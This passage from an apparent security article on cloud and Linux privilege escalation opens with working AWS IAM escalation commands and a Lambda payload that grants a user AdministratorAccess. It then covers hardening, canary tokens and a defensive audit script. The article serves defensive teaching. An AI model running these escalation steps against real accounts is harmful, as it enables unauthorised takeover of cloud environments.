
def lambda_handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='attacker_compromised_user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "Privilege Escalation Complete!"
```

```bash
# Create and invoke the function using the passed privileged role
aws lambda create-function \
  --function-name PwnCloud \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/SuperAdminServiceRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://payload.zip

aws lambda invoke --function-name PwnCloud output.txt
```

#### 2. `iam:CreateAccessKey`
* **Vulnerability**: Permission to generate access keys for other users.
* **Exploitation**: If an organization has an inactive administrator account or a service account without active keys, the attacker simply creates an access key for that user:
```bash
aws iam create-access-key --user-name lead_architect
```

#### 3. `iam:CreatePolicyVersion`
* **Vulnerability**: Permission to create a new version of an existing managed policy.
* **Exploitation**: AWS allows managed policies to have multiple versions (up to 5). An attacker cannot edit the policy text directly, but they can create a new version that grants full `*:*` wildcard access and set it as default:
```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/RestrictedDevPolicy \
  --policy-document file://admin_wildcard.json \
  --set-as-default
```

#### 4. `iam:UpdateAssumeRolePolicy`
* **Vulnerability**: Permission to modify the trust policy of an existing role.
* **Exploitation**: The attacker modifies the trust policy of an existing high-privilege role to allow their current low-privilege user to assume it:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "AWS": "arn:aws:iam::123456789012:user/attacker_user" },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

```bash
aws iam update-assume-role-policy \
  --role-name OrganizationAdmin \
  --policy-document file://trust_policy.json

# Instantly assume the target role
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/OrganizationAdmin --role-session-name pwned
```

---

## 6. Phase 5: The Blue Team Defense — Snapping Every Rung of the Ladder

Understanding the attacker's progression reveals an immutable truth: **an attacker only needs to find one open path, but a defender can engineer systematic invariants that break the chain at every single step**.

To stop ladder climbing, we must move from passive observation to active, multi-layer defense.

```
+---------------------------------------------------------------------------------------------------+
|                                 THE COMPREHENSIVE LADDER-SNAPPING MATRIX                           |
|                                                                                                   |
|   ATTACK STAGE              ATTACKER VECTOR                       BLUE TEAM REMEDIATION           |
|                                                                                                   |
|   1. Beachhead Recon        - Environment variable scraping       - Ephemeral secrets (Vault/K8s) |
|                             - Process snooping (/proc)            - hidepid=2 on /proc filesystem |
|                                                                                                   |
|   2. Lateral Pivoting       - SSH Agent Socket Hijacking          - Enforce ForwardAgent no       |
|                             - Chisel / Ligolo reverse tunnels     - Default-Deny egress filtering |
|                             - NFS no_root_squash writes           - Enforce root_squash on shares |
|                                                                                                   |
|   3. Vertical Escalation    - Sudo GTFOBins & wildcards           - Strict sudoers, no NOPASSWD   |
|                             - SUID / Linux Capabilities abuse     - nosuid mounts, cap drop       |
|                             - Container breakout (docker.sock)    - Rootless containers, no sock  |
|                                                                                                   |
|   4. Cloud Takeover         - SSRF to IMDSv1                      - Enforce IMDSv2 (HopLimit=1)   |
|                             - IAM permission escalation chaining  - AWS SCP permission boundaries |
|                                                                                                   |
|   5. Detection              - Silent subterranean movement         - eBPF runtime alerts & Canaries|
+---------------------------------------------------------------------------------------------------+
```

---

### 1. Invariant System Hardening Blueprints

#### A. Restricting `/proc` Process Snooping (`hidepid=2`)
By default on Linux, any unprivileged user can read `/proc` and inspect the command-line arguments and environment of all other running processes. This allows web application shells to view database passwords passed in CLI flags.

Remediate by remounting `/proc` with `hidepid=2`:

```bash
# Add to /etc/fstab to persist across reboots
echo "proc /proc proc defaults,hidepid=2,gid=admin 0 0" >> /etc/fstab

# Remount immediately
mount -o remount,hidepid=2,gid=admin /proc
```

* **Outcome**: Unprivileged users can now only view their own processes. All processes owned by other users or `root` become invisible.

---

#### B. Eliminating SSH Agent Hijacking
In your enterprise SSH client configuration and SSH daemon profiles, enforce strict agent forwarding restrictions:

```text
# /etc/ssh/ssh_config (Global Client Config)
Host *
    ForwardAgent no
    AddKeysToAgent no
    ServerAliveInterval 60
```

```text
# /etc/ssh/sshd_config (Global Server Config)
AllowAgentForwarding no
PermitRootLogin no
PasswordAuthentication no
AuthenticationMethods publickey
```

* **Outcome**: Even if an engineer connects through a compromised bastion, no socket is created in `/tmp`, eliminating agent hijacking entirely.

---

#### C. Enforcing AWS IMDSv2 and Restricting Hop Limits
To eliminate SSRF-based cloud credential theft, enforce IMDSv2 across all EC2 instances and set the HTTP PUT response hop limit to `1`.

When the hop limit is set to `1`, the IP packet's Time-To-Live (TTL) is decremented upon leaving the host network namespace. Because containers run inside their own network namespaces, the response packet expires before it can cross back into the container, rendering container-based SSRF against IMDS physically impossible.

```bash
# Enforce IMDSv2 with Hop Limit 1 on an existing instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-0a1b2c3d4e5f67890 \
  --http-tokens required \
  --http-put-response-hop-limit 1 \
  --http-endpoint enabled
```

---

#### D. Container Hardening: Enforcing Restricted Pod Security Standards
In Kubernetes, prevent container breakouts by enforcing the `restricted` Pod Security Standard via Admission Controllers or namespace labels:

```yaml
# Secure Kubernetes Deployment Manifest
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-processor
  namespace: production
spec:
  replicas: 3
  template:
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: payment-api
        image: payment-api:v2.4.1
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL
        resources:
          limits:
            cpu: "500m"
            memory: "512Mi"
```

* **Security Guarantees**:
  1. `allowPrivilegeEscalation: false`: Blocks SUID binaries from gaining new privileges.
  2. `readOnlyRootFilesystem: true`: Prevents attackers from dropping toolchains into `/tmp` or modifying binaries.
  3. `capabilities.drop: ["ALL"]`: Drops all POSIX capabilities, neutralizing container escapes.

---

### 2. Deception Engineering: Deploying Canary Tokens and Honeycredentials

The greatest operational challenge for defenders is **Mean Time to Detect (MTTD)**. Attackers frequently dwell inside enterprise networks for weeks before executing noisy actions.

To invert this asymmetric advantage, we deploy **Canary Tokens**: active, authentic-looking decoy credentials seeded across high-value pivot locations. The moment an attacker discovers and attempts to use a canary token, it triggers an instantaneous, high-fidelity security incident alert.

```
+---------------------------------------------------------------------------------------------------+
|                                  THE CANARY HONEYTOKEN TRIPWIRE                                   |
|                                                                                                   |
|    ATTACKER BEACHHEAD                   AWS CONTROL PLANE               SECURITY OPERATIONS (SOC) |
|                                                                                                   |
|    1. Discovers Canary Credentials                                                                |
|       in ~/.aws/credentials:                                                                      |
|       AKIA-HONEY-TOKEN-PROD                                                                       |
|                                                                                                   |
|    2. Executes AWS API Call:                                                                      |
|       aws sts get-caller-identity ===> CloudTrail Event:                                          |
|                                        Event: GetCallerIdentity                                   |
|                                        User: "canary-prod-monitor"                                |
|                                        Source: 198.51.100.42                                      |
|                                                    |                                              |
|                                                    v                                              |
|                                        CloudWatch / EventBridge                                   |
|                                        Match Rule Triggered!                                      |
|                                                    |                                              |
|                                                    +==================> PagerDuty P1 Alert!       |
|                                                                         "Host 10.10.20.15 is      |
|                                                                          Compromised! Active      |
|                                                                          Honeytoken Triggered!"   |
+---------------------------------------------------------------------------------------------------+
```

#### Canary Deployment Locations:
1. **Fake AWS Keys**: Place canary AWS access keys in `/home/deploy/.aws/credentials` and `.env` files.
2. **Honey SSH Keys**: Create an SSH key `~/.ssh/id_rsa_backup` that connects to a dedicated monitoring honeypot server.
3. **Database Honeytables**: Insert a fake table `admin_passwords` into internal databases with a trigger that fires an alert on any `SELECT` query.
4. **Active Directory Honey Accounts**: Create a user account `sql_svc_backup` with an SPN configured, but no actual systems attached. Any Kerberoast request for this SPN is an unequivocal indicator of compromise (IoC).

---

## 7. Phase 6: The Defensive Auditor Blueprint

To systematically evaluate whether your production servers harbor open lateral pivot paths or privilege escalation vulnerabilities, deploy the following production-grade Python audit engine: `ladder_auditor.py`.

This script runs locally on target hosts, performing comprehensive, non-destructive static and runtime checks without modifying system state.

```python
#!/usr/bin/env python3
"""
Ladder Auditor: Linux Privilege Escalation & Lateral Movement Vector Scanner
Author: Guilherme Viegas (https://gui13go.github.io)
License: MIT
Description:
    Evaluates host posture against SUID GTFOBins, writable cron/service units,
    exposed SSH agent sockets, missing proc hidepid, IMDS accessibility,
    and dangerous Linux capabilities.
"""

import os
import sys
import stat
import glob
import urllib.request
import subprocess

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

GTFOBINS_KNOWN = {
    "find", "vim", "vi", "less", "more", "awk", "rsync", "tar", 
    "env", "python", "python3", "perl", "ruby", "lua", "bash", 
    "sh", "zsh", "dash", "cp", "mv", "systemctl", "pkexec"
}

def log_check(name):
    print(f"\n{Colors.BLUE}[*] Checking: {name}{Colors.RESET}")

def log_pass(msg):
    print(f"  {Colors.GREEN}[PASS]{Colors.RESET} {msg}")

def log_warn(msg):
    print(f"  {Colors.YELLOW}[WARN]{Colors.RESET} {msg}")

def log_fail(msg):
    print(f"  {Colors.RED}[FAIL - CRITICAL RISK]{Colors.RESET} {msg}")

def check_suid_binaries():
    log_check("SUID / SGID Binaries & GTFOBins Matches")
    suid_found = []
    
    # Fast scan of standard binary directories
    target_dirs = ['/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin']
    for tdir in target_dirs:
        if not os.path.exists(tdir):
            continue
        for root, _, files in os.walk(tdir):
            for file in files:
                fpath = os.path.join(root, file)
                try:
                    st = os.stat(fpath, follow_symlinks=False)
                    if st.st_mode & stat.S_ISUID:
                        suid_found.append(fpath)
                except (OSError, PermissionError):
                    continue

    vulnerable_gtfobins = []
    for sbin in suid_found:
        bname = os.path.basename(sbin)
        if bname in GTFOBINS_KNOWN:
            vulnerable_gtfobins.append(sbin)

    if vulnerable_gtfobins:
        for v in vulnerable_gtfobins:
            log_fail(f"Dangerous SUID binary matching GTFOBins: {v}")
    else:
        log_pass("No common GTFOBins binaries possess SUID permissions.")

def check_proc_hidepid():
    log_check("/proc Mounting Posture (hidepid)")
    try:
        with open("/proc/mounts", "r") as f:
            mounts = f.readlines()
        
        proc_mount = [m for m in mounts if m.split()[1] == "/proc"]
        if proc_mount:
            opts = proc_mount[0].split()[3].split(",")
            hidepid_opts = [o for o in opts if "hidepid" in o]
            if hidepid_opts:
                log_pass(f"/proc is hardened with: {hidepid_opts[0]}")
            else:
                log_fail("/proc is mounted without hidepid! Unprivileged users can snoop all processes.")
        else:
            log_warn("Could not determine /proc mount status.")
    except Exception as e:
        log_warn(f"Failed to inspect /proc mounts: {e}")

def check_ssh_agent_sockets():
    log_check("Active SSH Agent Sockets in /tmp")
    sockets = glob.glob("/tmp/ssh-*/agent.*")
    if sockets:
        log_fail(f"Found {len(sockets)} active SSH agent sockets in /tmp (Agent Hijacking Risk):")
        for s in sockets:
            print(f"      - {s}")
    else:
        log_pass("No exposed SSH agent sockets found in /tmp.")

def check_docker_socket():
    log_check("Docker Socket Accessibility")
    sock_path = "/var/run/docker.sock"
    if os.path.exists(sock_path):
        st = os.stat(sock_path)
        mode = oct(st.st_mode)[-3:]
        # Check if world readable/writable or if current user can write
        is_writable = os.access(sock_path, os.W_OK)
        if is_writable and os.getuid() != 0:
            log_fail(f"{sock_path} is directly WRITABLE by current non-root user! Instant host breakout.")
        else:
            log_warn(f"{sock_path} exists with mode {mode}.")
    else:
        log_pass("No local Docker socket detected.")

def check_imds_reachability():
    log_check("Cloud IMDS Reachability (AWS/GCP/Azure)")
    imds_url = "http://169.254.169.254/latest/meta-data/"
    try:
        req = urllib.request.Request(imds_url, headers={"User-Agent": "SecurityAuditor"})
        # Short timeout to avoid hanging on bare-metal systems
        with urllib.request.urlopen(req, timeout=1.5) as response:
            if response.status == 200:
                log_fail("IMDS is reachable via stateless GET request! IMDSv1 is active (SSRF Risk).")
            else:
                log_warn(f"IMDS responded with status: {response.status}")
    except urllib.error.HTTPError as e:
        if e.code == 401:
            log_pass("IMDS returned HTTP 401 Unauthorized. IMDSv2 is enforced!")
        else:
            log_warn(f"IMDS HTTP Error: {e.code}")
    except Exception:
        log_pass("IMDS endpoint is not reachable (or host is not in public cloud).")

def check_writable_systemd_and_cron():
    log_check("World-Writable Cron Jobs and Systemd Units")
    cron_paths = ['/etc/cron*', '/etc/crontab', '/var/spool/cron/crontabs/*']
    writable_found = []
    
    for cpattern in cron_paths:
        for fpath in glob.glob(cpattern):
            if os.path.isfile(fpath):
                st = os.stat(fpath)
                if st.st_mode & stat.S_IWOTH:
                    writable_found.append(fpath)

    if writable_found:
        for wf in writable_found:
            log_fail(f"World-writable cron file detected: {wf}")
    else:
        log_pass("No world-writable cron configurations detected.")

def main():
    print(f"{Colors.BOLD}===================================================={Colors.RESET}")
    print(f"{Colors.BOLD}   LADDER AUDITOR: Privilege Escalation & Pivots   {Colors.RESET}")
    print(f"{Colors.BOLD}===================================================={Colors.RESET}")
    print(f"Executing as UID: {os.getuid()} | Target: {os.uname().nodename}")
    
    check_suid_binaries()
    check_proc_hidepid()
    check_ssh_agent_sockets()
    check_docker_socket()
    check_imds_reachability()
    check_writable_systemd_and_cron()
    
    print(f"\n{Colors.BOLD}===================================================={Colors.RESET}")
    print(f"{Colors.GREEN}[+] Audit Complete.{Colors.RESET}\n")

if __name__ == "__main__":
    main()
```

---

## 8. Conclusion: The Five Golden Tenets of Internal Resilience

The transition from lateral movement to privileged access is not an act of cybernetic wizardry. It is a deterministic, methodical progression through the architectural flaws, ambient trust assumptions, and permission oversights embedded in our infrastructure.

When you design, build, and audit production systems, internalize these **Five Golden Tenets**:

1. **Assume the Perimeter Has Already Fallen**:
   Design every internal server, microservice, and database as if the machine adjacent to it is already controlled by a malicious adversary. If host A does not have an explicit, business-critical reason to transmit packets to host B, enforce an eBPF network policy that drops the traffic.

2. **Sanitize the Local Environment**:
   An unprivileged shell inside a compromised container or worker should find an empty wasteland: no `/proc` visibility into other users (`hidepid=2`), no raw Docker sockets, no mounted root filesystems, and zero plaintext cloud tokens in environment variables.

3. **Treat Static Credentials as Future Breaches**:
   Eliminate long-lived API keys, persistent SSH keys, and static service account secrets. Migrate unconditionally to short-lived, cryptographically attested tokens (SPIFFE/SPIRE, HashiCorp Vault, AWS IAM Roles Anywhere) that expire in minutes.

4. **Disable Ambient Agent Forwarding**:
   Educate your engineering organization on the mortal hazards of `ssh -A`. Mandate ProxyJump bastions that forward TCP streams without ever exposing the local client's authentication agent socket to remote memory.

5. **Litter the Rungs with Tripwires**:
   You cannot prevent every zero-day vulnerability, but you can guarantee that an attacker climbing the ladder rings the alarm. Plant canary tokens, honeycredentials, and monitored tripwire accounts in every directory, database, and cloud account where an attacker expects to find treasure.

When the ladder’s rungs are snapped and every step is wired with explosives, the attacker doesn't reach the apex. They fall.
